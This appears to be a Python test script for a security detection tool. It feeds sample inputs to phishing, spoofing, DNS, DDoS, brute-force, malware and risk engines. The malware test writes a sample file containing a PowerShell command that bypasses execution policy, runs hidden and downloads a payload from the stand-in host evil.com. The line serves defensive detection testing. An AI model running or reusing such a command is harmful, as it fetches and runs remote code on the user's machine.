import sys
import os

sys.path.insert(0, r'C:\Users\DELL\Desktop\cybertool\CyberShieldAI')

from app.engines.phishing_engine import phishing_engine
from app.engines.ip_spoofing_engine import ip_spoofing_engine
from app.engines.dns_engine import dns_engine
from app.engines.ddos_engine import ddos_engine
from app.engines.brute_force_engine import brute_force_engine
from app.engines.malware_engine import malware_engine
from app.engines.risk_engine import (
    calculate_risk_level, get_risk_color, get_risk_badge_class,
    aggregate_risk, generate_risk_summary, format_result_for_db
)

print("=" * 60)
print("TESTING ALL DETECTION ENGINES")
print("=" * 60)

# 1. Phishing Engine
res_phish = phishing_engine.analyze_url('http://192.168.1.100/secure-login/paypal/update.php')
print(f"1. Phishing Engine: {res_phish['result']} | Risk Score: {res_phish['risk_score']} | Model: {res_phish['model_used']}")
assert res_phish['success'] is True

# 2. IP Spoofing Engine
res_spoof = ip_spoofing_engine.analyze_manual({'src_ip': '10.0.0.1', 'dst_ip': '10.0.0.1', 'ttl': 5})
print(f"2. IP Spoofing Engine: {res_spoof['result']} | Risk Score: {res_spoof['risk_score']} | Indicators: {len(res_spoof['indicators'])}")
assert res_spoof['success'] is True

# 3. DNS Engine
res_dns = dns_engine.analyze_domain('evil-tracker-phish.com')
print(f"3. DNS Engine: {res_dns['result']} | Risk Score: {res_dns['risk_score']} | Indicators: {len(res_dns['indicators'])}")
assert res_dns['success'] is True

# 4. DDoS Engine
res_ddos = ddos_engine.analyze_manual({
    'packet_count': 10000, 'duration_seconds': 2.0, 'unique_src_ips': 1,
    'unique_dst_ports': 1, 'src_ip_concentration': 0.95, 'syn_ratio': 0.9
})
print(f"4. DDoS Engine: {res_ddos['result']} | Risk Score: {res_ddos['risk_score']} | Model: {res_ddos['model_used']}")
assert res_ddos['success'] is True

# 5. Brute Force Engine
sample_logs = """
Nov 05 14:10:01 server sshd[1234]: Failed password for root from 192.168.1.50 port 45212 ssh2
Nov 05 14:10:05 server sshd[1235]: Failed password for admin from 192.168.1.50 port 45214 ssh2
Nov 05 14:10:09 server sshd[1236]: Failed password for user1 from 192.168.1.50 port 45216 ssh2
Nov 05 14:10:12 server sshd[1237]: Failed password for oracle from 192.168.1.50 port 45218 ssh2
Nov 05 14:10:15 server sshd[1238]: Failed password for test from 192.168.1.50 port 45220 ssh2
Nov 05 14:10:18 server sshd[1239]: Failed password for deploy from 192.168.1.50 port 45222 ssh2
"""
res_bf = brute_force_engine.analyze_logs(sample_logs, threshold=5, window_seconds=300)
print(f"5. Brute Force Engine: {res_bf['result']} | Risk Score: {res_bf['risk_score']} | Indicators: {len(res_bf['indicators'])}")
assert res_bf['success'] is True

# 6. Malware Engine
test_sample_path = os.path.join(r'C:\Users\DELL\Desktop\cybertool\CyberShieldAI\app\ml', 'sample_test.ps1')
with open(test_sample_path, 'w', encoding='utf-8') as f:
    f.write('powershell -enc AAAA -executionpolicy bypass -windowstyle hidden (New-Object System.Net.WebClient).DownloadString("http://evil.com/payload")')

res_malware = malware_engine.analyze_file(test_sample_path, 'sample_test.ps1')
print(f"6. Malware Engine: {res_malware['result']} | Risk Score: {res_malware['risk_score']} | Indicators: {len(res_malware['indicators'])}")
if os.path.exists(test_sample_path):
    os.remove(test_sample_path)
assert res_malware['success'] is True

# 7. Risk Engine
summary = generate_risk_summary('phishing', res_phish['result'], res_phish['risk_score'], res_phish['indicators'])
db_record = format_result_for_db(res_phish, 'phishing', 'http://192.168.1.100/secure-login/paypal/update.php', 1)
print(f"7. Risk Engine: Level={summary['risk_level']} | Color={summary['risk_color']} | Badge={summary['risk_badge']}")
print(f"   DB Record: module={db_record['module']}, risk_score={db_record['risk_score']}")

print("=" * 60)
print("ALL DETECTION ENGINES VALIDATED AND FUNCTIONING CORRECTLY!")
print("=" * 60)
